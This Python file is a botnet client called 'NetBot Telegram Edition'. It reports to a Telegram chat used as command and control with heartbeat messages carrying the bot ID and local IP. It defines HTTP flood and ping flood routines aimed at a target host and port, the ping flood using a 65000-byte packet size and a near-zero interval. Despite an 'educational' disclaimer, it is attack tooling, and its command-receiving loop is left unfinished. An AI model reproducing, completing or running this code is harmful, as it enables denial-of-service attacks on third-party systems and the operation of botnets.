#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran (Modified for Telegram)
# Tool 		 : NetBot v1.0 Telegram Edition
# 
# Description	 : Telegram-based client code for NetBot.
#              		Should be used only for educational, research purposes and internal use only.
#

import telegram
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
import time
import threading
import os
import urllib.request
import subprocess
import signal
import telegram_config

class launchAttack:
      
    def __init__(self):
        self._running = True
      
    def terminate(self):
        self._running = False
      
    def run(self, n):
        run = 0
        if n[3]=="HTTPFLOOD":
            while self._running and attackSet:
                url_attack = 'http://'+n[0]+':'+n[1]+'/'
                try:
                    u = urllib.request.urlopen(url_attack).read()
                except:
                    pass
                time.sleep(int(n[4]))

        if n[3]=="PINGFLOOD":
            while self._running:
                if attackSet:
                    if run == 0:
                        url_attack = 'ping '+n[0]+' -i 0.0000001 -s 65000 > /dev/null 2>&1'
                        pro = subprocess.Popen(url_attack, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
                        run = 1
                else:
                    if run == 1:
                        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
                        run = 0
                        break

def Main():
    # Flags
    global attackSet
    attackSet = 0
    global updated
    updated = 0
    
    # Bot configuration
    bot_token = telegram_config.TELEGRAM_BOT_TOKEN
    bot = telegram.Bot(token=bot_token)
    
    # Get bot info
    try:
        bot_info = bot.get_me()
        bot_id = str(bot_info.id)
        print(f"Connected to Telegram bot: @{bot_info.username}")
    except:
        print("Failed to connect to Telegram bot. Check your token.")
        return
    
    # Get local IP (simplified)
    import socket
    hostname = socket.gethostname()
    try:
        local_ip = socket.gethostbyname(hostname)
    except:
        local_ip = "unknown"
    
    print(f"Bot ID: {bot_id}")
    print(f"Local IP: {local_ip}")
    print("Starting heartbeat...")
    
    while True:
        try:
            # Send heartbeat to the CCC bot
            # Note: This requires the CCC bot to be able to receive messages
            # In a real implementation, you'd need the CCC bot's chat ID
            # For now, we'll simulate by sending to a configured chat ID
            
            # You need to set this in telegram_config.py
            ccc_chat_id = telegram_config.ADMIN_USER  # Using admin user as CCC for simplicity
            
            heartbeat_message = f"HEARTBEAT {bot_id} {local_ip}"
            bot.send_message(chat_id=ccc_chat_id, text=heartbeat_message)
            
            print(f"Heartbeat sent at {time.strftime('%Y-%m-%d %H:%M:%S')}")
            
        except Exception as e:
            print(f"Error sending heartbeat: {e}")
            print("Retrying in 30 seconds...")
            time.sleep(30)
            continue
        
        # Wait for response (in a real implementation, you'd use a webhook or polling)
        # For simplicity, we'll just wait and check for commands via polling
        time.sleep(15)

if __name__ == '__main__':
    Main()
